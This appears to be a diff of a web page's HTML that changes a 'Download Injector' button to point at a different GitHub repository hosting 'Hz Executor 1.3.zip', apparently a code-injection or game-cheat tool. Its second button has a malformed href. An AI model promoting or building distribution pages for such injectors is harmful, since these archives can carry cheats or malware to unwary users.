@@ -214,7 +214,7 @@
     <i class="arrow-left"> </i><!-- Стрелка слева -->
     <i class="arrow-right"> </i><!-- Стрелка справа -->
     <div class="buttons">
-        <button onclick="window.location.href = 'https://github.com/gdggggddfvff/herzomi/raw/refs/heads/main/Hz%20Executor%201.3.zip';">Download Injector</button>
+        <button onclick="window.location.href = 'https://github.com/gdggggddfvff/Herzomi-executor/raw/refs/heads/main/Hz%20Executor%201.3.zip';">Download Injector</button>
         <button onclick="window.location.href = '[https://example.com/page2](https://github.com/gdggggddfvff/Herzomi-executor)';">Visit GitHub</button>
     </div>
     <div class="waves-container">
